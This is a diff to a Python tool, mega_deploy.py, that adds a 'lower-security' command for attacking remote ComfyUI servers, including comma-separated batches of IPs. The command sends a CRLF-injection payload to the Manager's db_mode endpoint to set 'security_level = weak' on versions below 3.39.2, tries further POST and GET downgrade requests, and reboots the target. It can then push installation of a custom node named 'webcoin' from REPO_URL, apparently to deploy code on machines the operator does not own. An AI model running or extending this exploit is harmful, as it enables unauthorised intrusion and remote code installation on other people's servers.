@@ -21,6 +21,8 @@ Usage:
   python mega_deploy.py result    -t 10.0.0.1 --prompt-id <id>
   python mega_deploy.py errors    -t 10.0.0.1
   python mega_deploy.py reboot    -t 10.0.0.1
+  python mega_deploy.py lower-security -t 10.0.0.1
+  python mega_deploy.py lower-security -t 10.0.0.1 --try-install
 
 Supports comma-separated targets for batch operations:
   python mega_deploy.py install -t "10.0.0.1,10.0.0.2,10.0.0.3"
@@ -281,31 +283,32 @@ def _reboot_comfyui(base):
     return code == 200 or True
 
 
-def _prompt_reboot():
+def _prompt_reboot(log=print):
     """Tell the user to reboot from the Manager UI."""
-    print("  >> Reboot ComfyUI from the Manager UI to activate changes. <<")
+    log("  >> Reboot ComfyUI from the Manager UI to activate changes. <<")
 
 
-def _start_queue_and_finish(base, skip_queue=False, has_manager=True):
+def _start_queue_and_finish(base, skip_queue=False, has_manager=True, log=print):
+    lg = log
     if not skip_queue:
         time.sleep(1)
         code, _ = _get(f"{base}/manager/queue/start")
-        print(f"  queue/start -> {code}")
-        print("  Waiting 30s for task completion...")
+        lg(f"  queue/start -> {code}")
+        lg("  Waiting 30s for task completion...")
         for _ in range(6):
             time.sleep(5)
             sc, sb = _get(f"{base}/manager/queue/status")
             if sc == 200:
                 try:
                     st = json.loads(sb)
-                    print(f"  Queue: total={st.get('total_count')}, done={st.get('done_count')}, processing={st.get('is_processing')}")
+                    lg(f"  Queue: total={st.get('total_count')}, done={st.get('done_count')}, processing={st.get('is_processing')}")
                     if not st.get("is_processing") and st.get("done_count", 0) >= st.get("total_count", 1):
                         break
                 except Exception:
                     pass
 
     if has_manager:
-        _prompt_reboot()
+        _prompt_reboot(log=lg)
     else:
         _reboot_comfyui(base)
     return True
@@ -365,28 +368,127 @@ def _strategy_update(base):
     return False
 
 
-def _strategy_crlf(base):
+def _strategy_crlf(base, log=print):
+    """CRLF injection for Manager < 3.39.2; reboots ComfyUI on success."""
+    lg = log
     ver = probe_manager_version(base)
-    print(f"[crlf] Manager version: {ver}")
+    lg(f"[crlf] Manager version: {ver}")
     if ver:
         parsed = _parse_version(ver)
         if parsed >= (3, 39, 2):
-            print("  Version >= 3.39.2, CRLF patched. Skip.")
+            lg("  Version >= 3.39.2, CRLF patched. Skip.")
             return False
 
     import urllib.parse
     payload = "cache\r\nsecurity_level = weak"
     encoded = urllib.parse.quote(payload, safe="")
     code, resp = _get(f"{base}/manager/db_mode?value={encoded}")
-    print(f"  db_mode inject -> {code}: {resp[:200]}")
+    lg(f"  db_mode inject -> {code}: {resp[:200]}")
 
     if code == 200:
-        print("  Rebooting to apply config change...")
+        lg("  Rebooting to apply config change...")
         _get(f"{base}/manager/reboot")
-        print("  Waiting 40s for restart...")
+        lg("  Waiting 40s for restart...")
         time.sleep(40)
         return True
     return False
+
+
+def _lower_security_try_git_install(base, lg=print):
+    """POST /customnode/install/git_url like _try_security + mega_deploy direct strategy."""
+    lg("[lower-security] Install retry: POST /customnode/install/git_url (webcoin)…")
+    code, resp = _post(f"{base}/customnode/install/git_url", REPO_URL, timeout=60)
+    lg(f"[lower-security] git_url (JSON-encoded repo URL) -> {code}: {resp[:200]}")
+    if code != 200:
+        code, resp = _post(
+            f"{base}/customnode/install/git_url",
+            {"url": REPO_URL},
+            timeout=60,
+        )
+        lg(f"[lower-security] git_url ({{\"url\": …}}) -> {code}: {resp[:200]}")
+    if code == 200:
+        lg("[lower-security] Install accepted — queue/start + finish…")
+        return _start_queue_and_finish(base, has_manager=True, log=lg)
+    if code == 403:
+        lg("[lower-security] git_url -> 403 (security still blocking).")
+    return False
+
+
+def lower_manager_security_all(
+    base,
+    log=print,
+    reboot_after_plain=True,
+    try_git_install=False,
+):
+    """
+    Run every known Manager \"lower security\" tactic (merged from mega_deploy,
+    remote_deploy CRLF path, and _try_security-style POST probes).
+
+    Order: read probes → CRLF (legacy; reboots if successful) → POST setting
+    endpoints → plain GET /manager/db_mode?value=… → optional reboot if any
+    plain tactic returned HTTP 200 → optionally git_url install + queue finish.
+
+    Returns True if CRLF succeeded, any plain tactic got HTTP 200, or git install OK.
+    """
+    import urllib.parse
+
+    lg = log
+    any_plain_hit = False
+    crlf_ok = False
+
+    lg(f"\n{'='*60}\n[lower-security] Target: {base}\n{'='*60}")
+    ver = probe_manager_version(base)
+    db0 = probe_security_level(base)
+    lg(f"[lower-security] Manager version: {ver or '?'}")
+    lg(f"[lower-security] db_mode (before): {(db0 or '')[:200]}")
+
+    for ep in ("/manager/security_level", "/api/manager/security_level",
+               "/manager/setting", "/manager/settings"):
+        c, b = _get(f"{base}{ep}", timeout=15)
+        if c == 200:
+            lg(f"[lower-security] GET {ep} -> {c}: {b[:180]}")
+
+    crlf_ok = _strategy_crlf(base, log=lg)
+    if crlf_ok:
+        db1 = probe_security_level(base)
+        lg(f"[lower-security] db_mode (after CRLF): {(db1 or '')[:200]}")
+    else:
+        lg("[lower-security] POST security_level variants (_try_security-style)...")
+        for level in ("weak", "normal-", "low"):
+            for ep in ("/manager/setting", "/manager/settings",
+                       "/manager/security_level", "/api/manager/setting"):
+                for payload in ({"security_level": level},
+                                {"value": level, "key": "security_level"}):
+                    c, r = _post(f"{base}{ep}", payload, timeout=15)
+                    if c not in (404, 405):
+                        lg(f"[lower-security] POST {ep} {level} -> {c}: {r[:120]}")
+                    if c == 200:
+                        any_plain_hit = True
+
+        lg("[lower-security] GET /manager/db_mode?value=… (plain / value-based)...")
+        for pv in ("weak", "normal-", "low", "security_level = weak", "cache"):
+            enc = urllib.parse.quote(pv, safe="")
+            c, r = _get(f"{base}/manager/db_mode?value={enc}", timeout=15)
+            lg(f"[lower-security] db_mode ?value={pv[:24]!r} -> {c}: {r[:150]}")
+            if c == 200:
+                any_plain_hit = True
+
+        if reboot_after_plain and any_plain_hit:
+            lg("[lower-security] Plain tactics returned 200 — rebooting Manager once to apply...")
+            c, _ = _get(f"{base}/manager/reboot", timeout=15)
+            if c != 200:
+                _post(f"{base}/api/manager/reboot", timeout=15)
+            lg("[lower-security] Waiting 35s after reboot...")
+            time.sleep(35)
+
+    db2 = probe_security_level(base)
+    lg(f"[lower-security] db_mode (final): {(db2 or '')[:200]}")
+
+    install_ok = False
+    if try_git_install:
+        install_ok = _lower_security_try_git_install(base, lg=lg)
+
+    return bool(crlf_ok or any_plain_hit or install_ok)
 
 
 def _strategy_direct_git(base):
@@ -1560,6 +1662,16 @@ def cmd_reboot(base, args):
     return code == 200
 
 
+def cmd_lower_security(base, args):
+    """Try all Manager security-downgrade strategies (see lower_manager_security_all)."""
+    return lower_manager_security_all(
+        base,
+        log=print,
+        reboot_after_plain=True,
+        try_git_install=getattr(args, "try_install", False),
+    )
+
+
 # ═══════════════════════════════════════════════════════════════════════
 #  Batch runner
 # ═══════════════════════════════════════════════════════════════════════
@@ -1621,6 +1733,7 @@ COMMANDS = {
     "result":    (cmd_result,    "Check specific prompt result"),
     "errors":    (cmd_errors,    "Get execution errors from history"),
     "reboot":    (cmd_reboot,    "Reboot ComfyUI via Manager"),
+    "lower-security": (cmd_lower_security, "Lower Manager security; add --try-install for git_url webcoin"),
 }
 
 
@@ -1636,6 +1749,11 @@ def main():
     parser.add_argument("--https", action="store_true", help="Use HTTPS (auto-detected for port 443)")
     parser.add_argument("--prompt-id", help="Prompt ID (for 'result' command)")
     parser.add_argument("--gpu-only", action="store_true", help="GPU-only hotfix (for 'hotfix' command)")
+    parser.add_argument(
+        "--try-install",
+        action="store_true",
+        help="For 'lower-security': after tactics, POST /customnode/install/git_url (webcoin)",
+    )
     args = parser.parse_args()
 
     use_https = args.https
